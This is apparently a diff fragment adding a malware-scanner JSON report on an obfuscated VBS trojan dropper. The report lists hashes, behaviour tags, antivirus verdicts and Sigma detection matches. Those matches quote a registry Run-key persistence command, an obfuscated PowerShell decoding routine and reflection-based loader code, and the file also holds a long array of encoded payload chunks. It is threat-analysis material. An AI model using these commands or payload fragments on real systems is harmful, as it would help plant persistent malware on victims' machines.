+          "boPb+4A/hHAS0OklL+5VzBAdrnwwwQRv8e1hd1AiVARv0nakzo0sTaHXeSrtLHkU/e25BtoQ6VboGEcGT8B5FWXtiYReWm7owdIBFP/B4zj+Wz60wR94jBDc",
+          "RtmmiD+qCW30HlhY0wcbTgdz5JPEQSx7hFcEzrN3g12blNIITKw4oFKySkPCpJjjTx5wJYhHOwoq",
+          "N0DQofDqDl8+Idxk0MzdTMTW9z3yWEsvtNfxaLeFi4ZdghEBjxf1DGUYgVW5MpDHpm46qUEVMfVyXzsa",
+          "2aQ81p4fbRzg/hL1F4WEfXeu+6wHrWLz94",
+          "AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8G5FP3geRT/0TkU/7B5FP/AeRT/wHkU/8B5FP/",
+          "RmsU+fokK/GDBIyP9MGLr8clOTOadq",
+          "ADQXQHkAGYwN4mXKVH/viZQMAKPRqrcfhYszvjvfMjjRJ5DbgR4/BT",
+          "aoH8AOUMTzAcCSkelHIyoGqfEd0XVrAyNkHhBndS5EOVU9s+f3MjG1EAPU8bAdYRmu5hQCueqhj3e6tn",
+          "v2ZsDJucSOpxA+k0EWtYvuU5tZ3/r9RyqPCf9fUHDrhkRUf9udvqIM74BgIakgAMvsUEm6tjGrEhnWAQ",
+          "hzYmE38GpZtLw6QbSxIsD/hA/GRrweMTQPamE3mh66TrzhlfyllalbUS5FP/CdqUumm4UwdPlFP/",
+          "U/8B5FP95qIE",
+          "baPA7iEWCoX8C60FfVBm1Jxyazk2YF",
+          "UEnXju+6wJpFzXnj9jHOD+EvS3gYzWn79i3OD+EvXHhYTLe+Ec1h/Z",
+          "Qgngc6U+zxl7Fmvr3kH8isvCt72ChDB/gqVikMfEVDYgPXjXDxEkIg",
+          "emZ2nVDz0s8Q",
+          "DcE/fJf9RgZdfaRIH4owO1sm9efL956Qe7",
+          "lbM4v4fpxlG0YEqAgU8gZ3EvHMe/kalQhO9eJZVEguZtJPZvEue+3xPs2F+4yiE//sSpSj15BzaZ",
+          "AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT/wHk",
+          "hC43flOlseBE7OKPap7+Oc4fyjc71uqDBt3+0lgyGdeRNek9boI8JMtjnyUnMXJolAQYgPzn8RJs",
+          "VpRWm/U6JHAKBxHe9Mpu0utXfym87dvD5MQ/U0DijNMPrc4gG2vrhioX8PSJXq1OwEbvPbqPGvzs2OGN",
+          "iaWQ1nAliECFsJi2SuGD70mX/MuKq8D2P71N3G3jKXsl6TORH64vZ4VEt410fFRWYNl4KGXH6DlEQDr5",
+          "ZU3GGi3Wk5RcgLbwB45s62GAVHpfUR47Cc4NN+SLCTXE5UK1HHMXm1soXnyk9jVGPzsTapn33lIEUw3q0dL87r5fOnEK/yufArIsPcG4C6qWXZlircHXNMj2",
+          "RT/wHkU/8B5FP/AeRT/wHkU/8B5FP/AeRT",
+          "SW0FqT2mRbKyHcrgSdhDODT9Uanmj2NW4vIvDDGJPttXMYpPycdOvBUeC0SciMc0kAprL4H2",
+          "lSci71MZEP/BOyHvUPhVpGHh0P/CVtbw0DsDJ/5ryPfAezkPUBsDA/5ruPfAeLYzYXkXXCTFFP6b2bg/",
+          "5FP7AeRX3wHkU/8B5FP/AeRT/wHkU/8B5F",
+          "2TFY69ub29ujJgQGb+P1gFlSVFUmAnmXLjK6NCBTcKPhSgis8AIuH5gvx9ag5uaDJZjPUfzdFZa1ju5M",
+          "Av7E2QNIkjyO7hkyj/ctSo6ngffc/xKWxoFLuSGJMzKqInJdZQahPDAqAq3lCTSq7v5wZksQqaoC0uF0",
+          "gsdeGhd1xb8usCaUM159pYzPHhwS9cm/LrAmh7NefSWEzIY16fAD3Rot7Y3rYAS4bpVypYDPhirp8APn",
+          "I2sZcuzlZHPLbsH+frM652P7BF+7ZJ4of2m/o/YjN8fzO1pPtoHu8goKqyoiwhnKzuFdSuQkVeGj9vse",
+          "FJfmurtp2sRtELW8F8maYJuG7DZJF6OelIo+0nof4o2HLONaDcDfrDAMGMv3QcxJfdDpR53+4IIYg07E",
+          "0fYwctYLegCEv/L7kxjaj9/6YTEdqY",
+          "U4M1qjDfXnhyT0K35Y6GHcfk0bfeViCIl8hZwWWfuHY3vLjsbKFx/lHOAC8apmnIVwhrnEsyIIIr",
+          "i/4WN0X/ch+KSsIzPA6b0adOwS1ZpTyIcVzUnS31sZBPf6DogapS6jS2gxKSHrh9wJqxKk7l0hw2RJmz",
+          "dDJSpUi7Z+gScQbf5nTuoFlt8n3sU",
+          "qqdTeaq2eiDM",
+          "MrxokwltseYykVFuskuT4ULSPZswe0qH0wqjS+Bf3WbFRSXW26akUHOTlygeR1WMUraP7MvhEecP",
+          "zbcY6VBfQbimiuSuXrgMFcnRSWeloPFXN3cdLTF1HrgNeIW358RtsErLBOYt5l8N7lFEvJj+w3UGHRj/",
+          "azhjLFqvc2UBdkMPIeRQjjUJKhEzMCjZy/suZzghcPmvNU/c40XfpEHIpRPQJUf5pDrtWm5GcR+wGny9",
+          "p0nrzAfaTV9sBGNA7JxO7Mhd+hsmPhL3HkdG7bWvFUqlQtuXbCDoRue5GvlWkjLh2NmmEBMIg4bXKx0/",
+          "DBqzTy4H46345cOPLvbEV4y6Q5WJYZMBMVsJIF83RbHhxi0ZT8nkEKbVC2qOhsuo9PMqpUbB9vTa",
+          "YEXeFhgtbUVzWHsljMfeHBAt7Y9G2Q53RNV8PbR3Q/hzkvUEi9YeFhT13b8usCad815+vY53",
+          "CSvHY8cnT/fsvhlJZv9RaJLUOWxJRD",
+          "GwbDu2Flu1DpE5I5CTEM9MMfNsDBekjwNz1aUtzKlAVb0Ud7CoIiJNdrcRqhhBF8p4MX1A71Et2pEZ7FyJhSIUx4kBvhygcExxNeDHHO3+uPGqGeoa0Ye5OB",
+          "fA2a2upQo9Zj4v3mE47jSZJ68rr3A6oudEKCPmnJygdwmuzlDobYQAsge+Jikm+mABYH/MZ7gFLF0MYfqtW7FsdgGGW1w5o13Y1R9uexJUjXy/URGxy/fnHX",
+          "uumjs4TEb4JW1tLQ6Wba0OmXApwrAy",
+          "vWtLtQcrj8RrJXmBLQJLlj95bvyttoRWkLWkQYP+2TDN9n/ze3VPHaGW6SXgOf6geziXBbZ4V/4IDrby",
+          "psuMavVjY5qDPLDfy6v4Bk70Q/5jCkb6tJVLvLSNVD1zgaMKePH5crpJx4oBS4lAGV8xCPWGATEo",
+          "hxvuwlgM3ml2tiAThulWUlgM4eFBft6YUr",
+          "OWZPk2S8Vf5w3MNtxm+6by9XWljf9vG+t1",
+          "kaTpGk2gPZL6u7jmAXP7sOJfmO30ejWpG6WmcFpTgRi29J1G8Q/rQFirS2gFBvZXEYW9nQ7cBUf5fydP",
+          "A7MauXsG0Rwy5rLsZa/h/O4kJ1TNtcfAmKbQwE5B4dItQQuFDZpa5txcCn2AkS1ZmaBXNSeQQsCXLM+Q",
+          "Rx7PwHkUwR9F20nlaYR/L1jJAe9ZKiCcthQwreH74g3lKiCWXERvoEfL0mgfIO/qVERvYEfILtpW",
+          "cBXb8r4zmPlHSNqpTWcIRZYeuVcs9INo1MChMEsn2OViHUASI9m59n3psZ0F07w5ysQsWVJM",
+          "Hre2EK04G+G6VYKWQ9cO9LrAmj7NeeCWKx94UELXHvS6wHrGL1d4QEbXEvS6wJpyzXn/9p3VD+EvUHhY",
+          "H+jwA8R8/+abiO2sRCtbBbhujBG3i9RlpcENxhbo8APEfP/mncjtrEarQgW4bowRt7G+9B4zH763",
+          "PQxbAyFyJ8V7+sdUBQHzR82n82uCLoif2F/YGegVADNx0W4oSrJw/c",
+          "ZOO8sV2T3RP9Xv6Gydni+IJXGcL2QYadA58l/8vVB2xZCyILjH2jXR0XiNYunwcINzZYfShGi2x7jtkM",
+          "oxlVxBjg8oU5SPf1gn9jnZ8UKzdLg9MuWsfYm6gSt2rWBjc52Z2+9ABV9D5idASgvxLWCw0/+oUp0Br5iv+VNhzGZnjZtT7ox3QOAx4WnX5PIxgoKCY+pHo5",
+          "UvS3a/iKdSQWmXUCZiDT2xvw/wK8kaj14mTGASybPnvZ85/sz5IRLy54a/UbevNxM/x05IUsM/uaefyT26VyjnLqGhvD+HLin/QVVD4E/m1hsJxmY9aNq3tQuoTIbNttBXlc",
+          "SNt64XL2p4UE",
+          "ncnRV2vx4VnREzqr8uTVyfa8mOSYeDi4ghdO89GzD5WoXzAN9Ogn+aDZXUpVlK/qoRBPVP9AepFo",
+          "usB7SmE3/6iFVYB4zH389oHQD+FKiTB0KVl5HK2IH+G6MEbWL0iWlw8tGLeqwA8R8/+aHiO2shqt",
+          "X9g/5TblGuDGdwDAXi+NtuWZRF9JeASJLReiumA2x70yJfyECaGhq0YVPE/P707+qilTWIPLbYh4nGbr",
+          "Gf+jh0aXePW8WKf8EkTv6FTMGsa7jlbWkcjptv4o4qXvG9x4aZ+e7TpUn9JkIhh52lYCZLqOHg0+34n3PsVuMRANAslfsrFTsTDCavXGcy0fdlHpDC7hdLmnVsJ95HuhQr+m",
+          "lHv1kD+6ntfDcLbNOtrAxePnk8oN9KkUHG+766N0zO/9fvAFXJeNMYNnt4NyAtdLJZflSdT1NbW30WMN",
+          "Lgbooyjnhdrrb",
+          "cExWlmNTAb8D",
+          "mFv/6iFVYB4zD4Ym7bADxHz/5aXBHt7WmFre1Jhc5o3I7aAdq1UA+G6trw6FbS8Oh0wRt4vB5aXBBV7W",
+          "BwWX8wYUL71UHBf1Oq7uXH144x3BJE",
+          "12WKEVgBdoJz0M8f2g15ChKYC/E4+7ehY2hyrfGyiJtYasF9DOCUmvpLZGVVz/InjN68HOXTVDmCEhKNOvJMwCUe7jVrNBeHlMOQnMgHF44kQCscizGNTw1+",
+          "uCJFP+geRT/znka/yE5FP/geRT+wTk",
+          "lsufcG2U2sc7nbUtB2zDp4PysPVDvIbIXV0sxEiDE58FN/Vu60FpFD0Cs/Wr0roGs+ap+LgOQk5q",
+          "G6wJpszXnU9kXAD+HNefh0K7eGDa3MDuG6VcqWAyt4SEi3ngbNcfv2pcEP4c150pQANHhYRr",
+          "gBmeIbyWLk5DA7BfePoeDZ3p8yLL25NEamYo3uRzLFydNqHNlgktsllYATBxxWDBKMwtVGWQzoLZHK3q",
+          "1h7Xn55yZS8bZZWvpPaPzpM0pmPPB8WtyeUKIWQg1Rh0BrefYW5OLpmWqQUi91YYeOutBluaUnS7",
+          "Oav2j7yfzUY9pSUKOQxOd1dE/lBMc2w1b5q2eIThbDWsSVbRejkwgNR3yi+KaaaPPKdPEfXwnPFzW5qx",
+          "fyrC6o37XJAJVXgor2J3AEvj83kigq",
+          "04pM+Y5GMCJ8RcqkNehf21ZNhVYmlbdzhzKku0191PHwwz+mjLtpLFAx5SymtXGc0BlZI5xqHvx+DGDG2jN+W5UWBTGDwBnuqFODMMU3p/WDOeZmI4ekTlxCONA5M/tVPkRI",
+          "8cgk1Dnjulx+H2EmAz2e51FaU/+4ZR7jY3",
+          "oWOr2uUQgy0i7XK5zAjI2iAXtXvr7JSZZQCvleHJZfYdMIK3kCkTV1URFirec7R20rUEQ5Zsi79INb/BRO1VgLyR13wocXAVw5dDC170wDeic9voCeMw18NgpW9LplV3BfHj",
+          "Z5aY89vFm5VRRsOt3YqlqW2k23On/",
+          "X7igyqU1n0qH7KMOlHMVQ2MWQO7BgQtbL60RDplPfAeL2Otm55L/Xh8U6wMMTmWlylj5F12wBsdL2OteHwBhAPIdPGfvDvxHkVM4njOOXPYR1l5Whkrs18jB",
+          "X9c+DS0QfCE/BGwvj2Ak0uwk7kg9PyOU7NaWreU8Zi5vPoPxt0EkT9Zmug/YM4NWJvQa7/MiX0mUh3Qb",
+          "bfYPHY6KAL9E4wdt7wuzryC8hxlZ/TKfq41J8b6hMow/vXBUFlzcULd4T8VhSa0J4VBsjZTFj+P9",
+          "wwe0N3Z0azQV3BjhHOPgWkgR34U8uxysABORgrD+q0VtmKpqb6uSf8dfU95/bIbn8oUGVJuuDHdJUCjKvkF+AwnN54qXFE3S1M81CfDxKDOdYxkfsIQEG0Pe",
+          "Rt4vVpaXBzOWlw87GOezwA8R8/9z2llZeVxN/KZ0INcW6LrAe2phM3rOL2R4SEHXJui6wJoUzTkY",
+          "KpHGfRRNPfNbVrayuE4iNaAjEmRIyLFxXXO41dYk4sCE5kInz8Pgfw2zccsxMVibaVxVB+cXJZmu0fEq",
+          "/N/vMGhOkC1AkO26xLFyxOzKVvzpmjjf9pKxhaY64K9BAeqc0HTNo97bFa2CzhmiKuF77UYv",
+          "LAiwH/oBZj8CcZSHZViAqFJyFfSaUIpZYCMS4NYssz5VZdGk7bLqW2CHIqwfI03HgAHXydKDlBIkwUgBhUYvpXlLwEpCXpjpNl+j5MFls+31F8xVfkZNJCZyN0BOX/8DHlJV",
+          "CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQP/AeRZCQkJCQkJCQkJCQkJCQkJ",
+          "8FxPWzLE76XWtY2+li13TM+6WnCpxC7z46AmqXpUc51S/FkfLWWngJSaFSCtjWlMGLwTQxkZE6BhE+us",
+          "723KE1+oC9QAALtl0nubYmZRr2BN57XZRjdxjjAyiEKKtlkC8waHI8eKFtTHQqzkK8tJsRLnqQclO68+",
+          "wa7ERdDBrvGlZDIfF39EPD64oUCdLlm7kPkRHbfNOQiOWOUmfyVsNA4qp+0Xdx0116a1KieAngCDliB7",
+          "XsozwmbjLkoV",
+          "z/wLYxZeRasYvEeRWylSM6L1AJHP/BJE9fhLEU/qXQZDA9DwP//m7E/8B4htP0uRT/wm4xL9ZUMLxscz",
+          "zq+8rZXcKO/SFBlnv+zlYFufKhALisQ/MDbq7kFFUI2nKuRI5+cZe4y66hYdw54T6fwsSupvM0pi2KYNI4zl56vmnz6zThfKoAOToysjPbV2bOthVZ4E2+xZdATZPhnl3fXv",
+          "phL3lSYSvL3TeWw8x+/IUZI7zMQXhL3i2XWclKYSeEFsb48nh8KIXmxvjyEfIweVJhJ5abjDB1frrADy",
+          "686D8OVAcAZZnFLgu6eDmobQh6EXI/PtbvWpUevRaU4YVvAIeeklRtPWROLf8gYnULPNZ2EQ",
+          "WGbXmvS6wJoezXnrlhsjeGhX16r0usCaJM151fYV1Q/hxvvYlhsdeFhkYavdFmmaea0EGuG6tIQ6",
+          "dWhN7lhGDlU76OIR7vSh/6Z8nLvk3",
+          "b3Y9PSQ/HPqlJ287pELWHEVq5wGlTIr+YdF09zTrp31JcsecIZ8PZC/nd6VW/mmgoHyPzqXUBj3Lxnxe"
+        ]
+      },
+      "sha1": "490a7103c5d7631da5b38c31839a8aee7da33ab4",
+      "names": [
+        "wamulzyd.exe",
+        "545409.vbs"
+      ],
+      "type_description": "VBA",
+      "md5": "97b1c1dcaf1b9d847519116c5247a525",
+      "meaningful_name": "wamulzyd.exe",
+      "total_votes": {
+        "harmless": 0,
+        "malicious": 1
+      },
+      "ssdeep": "12288:B4FGPXtVIGeiMpqhfg4pfY0gdYXnRJaBpIdMYN/rt7Xe8vrxCaF7mz7+PVQCKpk9:BHDuBltdFBWWY5rt77vrckq7E6C6ZWN",
+      "sha256": "82a2d71036dd17ab2b3489bf965a4bc496e3fbe631dbc076cb98013a8b519a8a",
+      "type_extension": "vbs",
+      "tags": [
+        "long-sleeps",
+        "calls-wmi",
+        "vba",
+        "obfuscated",
+        "enum-windows",
+        "idle",
+        "persistence",
+        "macro-powershell",
+        "run-dll",
+        "write-file",
+        "run-file"
+      ],
+      "popular_threat_classification": {
+        "popular_threat_name": [
+          {
+            "count": 9,
+            "value": "smvcncpw"
+          },
+          {
+            "count": 2,
+            "value": "donutloader"
+          },
+          {
+            "count": 2,
+            "value": "malgent"
+          }
+        ],
+        "popular_threat_category": [
+          {
+            "count": 12,
+            "value": "trojan"
+          },
+          {
+            "count": 3,
+            "value": "dropper"
+          }
+        ],
+        "suggested_threat_label": "trojan.smvcncpw/donutloader"
+      },
+      "sigma_analysis_results": [
+        {
+          "rule_level": "medium",
+          "rule_id": "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "CurrentVersion Autorun Keys Modification",
+          "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+          "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
+          "match_context": [
+            {
+              "values": {
+                "EventID": "13",
+                "Details": "%%TORO%% -w 1 $inwindi=(Get-ItemProperty -Path 'HKCU:\\SOFTWARE\\AppDataLow\\').Pellentesque;%%TORO%% ($inwindi)",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "EventType": "SetValue",
+                "TargetObject": "HKU\\S-1-5-21-4005801669-2598574594-602355426-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Aliquip"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "a5f575ade1f2aaba452086d3418d8a893e94b28e30da42ad98b58df4a4fe9c2d",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Potential Suspicious PowerShell Keywords",
+          "rule_description": "Detects potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework",
+          "rule_author": "Florian Roth (Nextron Systems), Perez Diego (@darkquassar), Tuan Le (NCSGroup)",
+          "match_context": [
+            {
+              "values": {
+                "ScriptBlockText": "$LobortisBlandit = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName($Minimrczhjw)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule($Gravidakug, $false).DefineType($Incididunt436, $Maecenas541, [System.MulticastDelegate])",
+                "MessageTotal": "1",
+                "ScriptBlockId": "fdab05f1-3c1e-49ce-bd5f-ab84cb42fbf6",
+                "Path": "",
+                "EventID": "4104",
+                "MessageNumber": "1"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "c089503ba0204ebcc3605f01ef3ba76dfff60846f2bad81faf9eae455e81921b",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Suspicious PowerShell Invocation From Script Engines",
+          "rule_description": "Detects suspicious powershell invocations from interpreters or unusual programs",
+          "rule_author": "Florian Roth (Nextron Systems)",
+          "match_context": [
+            {
+              "values": {
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "Windows PowerShell",
+                "EventID": "1",
+                "ParentCommandLine": "\"C:\\Windows\\system32\\wscript.exe\" \"C:\\Users\\Bruno\\Desktop\\545409.vbs\"",
+                "CommandLine": "\"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" \"Add-Type -AssemblyName System.Windows.Forms;Write-Host '************************************************************************************************************************';Function Elit ([String]$Malesuada){$Deserunt='';For($Viverra=1; $Viverra -lt $Malesuada.Length-1; $Viverra+=(1+1)){$Proident=$Malesuada.Substring($Viverra, 1);$Deserunt=$Deserunt+$Proident}if($Deserunt){-join $Deserunt[($Deserunt.Length-1)..0]}else{$Deserunt}}A [TRUNCATED]",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "ParentImage": "C:\\Windows\\SysWOW64\\wscript.exe",
+                "IntegrityLevel": "Medium",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "cfe58f03c01bfef6fd133a3da09440cc5613a5dbeb310ee795cc443e18538943",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Suspicious PowerShell In Registry Run Keys",
+          "rule_description": "Detects potential PowerShell commands or code within registry run keys",
+          "rule_author": "frack113, Florian Roth (Nextron Systems)",
+          "match_context": [
+            {
+              "values": {
+                "EventID": "13",
+                "Details": "%%TORO%% -w 1 $inwindi=(Get-ItemProperty -Path 'HKCU:\\SOFTWARE\\AppDataLow\\').Pellentesque;%%TORO%% ($inwindi)",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "EventType": "SetValue",
+                "TargetObject": "HKU\\S-1-5-21-4005801669-2598574594-602355426-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Aliquip"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "eb75f9de2201bfad4ef177dca85b0b8fa8e5a86ba2357af5301f72acbc5eb144",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Suspicious Execution of Powershell with Base64",
+          "rule_description": "Commandline to launch powershell with a base64 payload",
+          "rule_author": "frack113",
+          "match_context": [
+            {
+              "values": {
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "Description": "Windows PowerShell",
+                "EventID": "1",
+                "ParentCommandLine": "\"C:\\Windows\\system32\\wscript.exe\" \"C:\\Users\\Bruno\\Desktop\\545409.vbs\"",
+                "CommandLine": "\"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" \"Add-Type -AssemblyName System.Windows.Forms;Write-Host '************************************************************************************************************************';Function Elit ([String]$Malesuada){$Deserunt='';For($Viverra=1; $Viverra -lt $Malesuada.Length-1; $Viverra+=(1+1)){$Proident=$Malesuada.Substring($Viverra, 1);$Deserunt=$Deserunt+$Proident}if($Deserunt){-join $Deserunt[($Deserunt.Length-1)..0]}else{$Deserunt}}A [TRUNCATED]",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "ParentImage": "C:\\Windows\\SysWOW64\\wscript.exe",
+                "IntegrityLevel": "Medium",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "low",
+          "rule_id": "1c2e4db94ca79f939e94e29c04fb3b71467fc6f5b9c31db34fcce5a2fb3b856f",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Non Interactive PowerShell Process Spawned",
+          "rule_description": "Detects non-interactive PowerShell activity by looking at the \"powershell\" process with a non-user GUI process such as \"explorer.exe\" as a parent.",
+          "rule_author": "Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements)",
+          "match_context": [
+            {
+              "values": {
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "Description": "Windows PowerShell",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "ParentCommandLine": "\"C:\\Windows\\system32\\wscript.exe\" \"C:\\Users\\Bruno\\Desktop\\545409.vbs\"",
+                "CommandLine": "\"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" \"Add-Type -AssemblyName System.Windows.Forms;Write-Host '************************************************************************************************************************';Function Elit ([String]$Malesuada){$Deserunt='';For($Viverra=1; $Viverra -lt $Malesuada.Length-1; $Viverra+=(1+1)){$Proident=$Malesuada.Substring($Viverra, 1);$Deserunt=$Deserunt+$Proident}if($Deserunt){-join $Deserunt[($Deserunt.Length-1)..0]}else{$Deserunt}}A [TRUNCATED]",
+                "EventID": "1",
+                "ParentImage": "C:\\Windows\\SysWOW64\\wscript.exe",
+                "IntegrityLevel": "Medium",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        }
+      ],
+      "last_analysis_results": {
+        "Bkav": {
+          "method": "blacklist",
+          "engine_name": "Bkav",
+          "engine_version": "8.2.40(8338)",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Lionic": {
+          "method": "blacklist",
+          "engine_name": "Lionic",
+          "engine_version": "8.16",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan.Script.SmvCncPw.4!c"
+        },
+        "MicroWorld-eScan": {
+          "method": "blacklist",
+          "engine_name": "MicroWorld-eScan",
+          "engine_version": "14.0.409.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "GT:VB.SmvCncPw.1.6240C73B"
+        },
+        "ClamAV": {
+          "method": "blacklist",
+          "engine_name": "ClamAV",
+          "engine_version": "1.5.4.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "CMC": {
+          "method": "blacklist",
+          "engine_name": "CMC",
+          "engine_version": "2.4.2022.1",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "CAT-QuickHeal": {
+          "method": "blacklist",
+          "engine_name": "CAT-QuickHeal",
+          "engine_version": "22.00",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "Skyhigh": {
+          "method": "blacklist",
+          "engine_name": "Skyhigh",
+          "engine_version": "v2021.2.0+4045",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "BehavesLike.VBS.Backdoor.bp"
+        },
+        "ALYac": {
+          "method": "blacklist",
+          "engine_name": "ALYac",
+          "engine_version": "2.0.0.10",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "GT:VB.SmvCncPw.1.6240C73B"
+        },
+        "Malwarebytes": {
+          "method": "blacklist",
+          "engine_name": "Malwarebytes",
+          "engine_version": "3.1.0.296",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Sangfor": {
+          "method": "blacklist",
+          "engine_name": "Sangfor",
+          "engine_version": "2.22.3.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "K7AntiVirus": {
+          "method": "blacklist",
+          "engine_name": "K7AntiVirus",
+          "engine_version": "14.91.61413",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "K7GW": {
+          "method": "blacklist",
+          "engine_name": "K7GW",
+          "engine_version": "14.91.61415",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "CrowdStrike": {
+          "method": "blacklist",
+          "engine_name": "CrowdStrike",
+          "engine_version": "1.0",
+          "engine_update": "20251219",
+          "category": "undetected",
+          "result": null
+        },
+        "Arcabit": {
+          "method": "blacklist",
+          "engine_name": "Arcabit",
+          "engine_version": "2025.0.0.23",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "GT:VB.SmvCncPw.1.6240C73B"
+        },
+        "VirIT": {
+          "method": "blacklist",
+          "engine_name": "VirIT",
+          "engine_version": "9.5.1335",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Symantec": {
+          "method": "blacklist",
+          "engine_name": "Symantec",
+          "engine_version": "1.22.0.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "XSNet.Heur!gen12"
+        },
+        "ESET-NOD32": {
+          "method": "blacklist",
+          "engine_name": "ESET-NOD32",
+          "engine_version": "18.2.18.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "VBS/TrojanDropper.Agent.OXI trojan"
+        },
+        "TrendMicro-HouseCall": {
+          "method": "blacklist",
+          "engine_name": "TrendMicro-HouseCall",
+          "engine_version": "24.550.0.1002",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan.VBS.DONUTLOADER.YXGKIZ"
+        },
+        "Avast": {
+          "method": "blacklist",
+          "engine_name": "Avast",
+          "engine_version": "23.9.8494.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Script:SNH-gen [Trj]"
+        },
+        "Cynet": {
+          "method": "blacklist",
+          "engine_name": "Cynet",
+          "engine_version": "4.0.3.4",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Malicious (score: 99)"
+        },
+        "Kaspersky": {
+          "method": "blacklist",
+          "engine_name": "Kaspersky",
+          "engine_version": "22.0.1.28",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "UDS:Trojan.VBS.SAgent"
+        },
+        "BitDefender": {
+          "method": "blacklist",
+          "engine_name": "BitDefender",
+          "engine_version": "7.2",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "GT:VB.SmvCncPw.1.6240C73B"
+        },
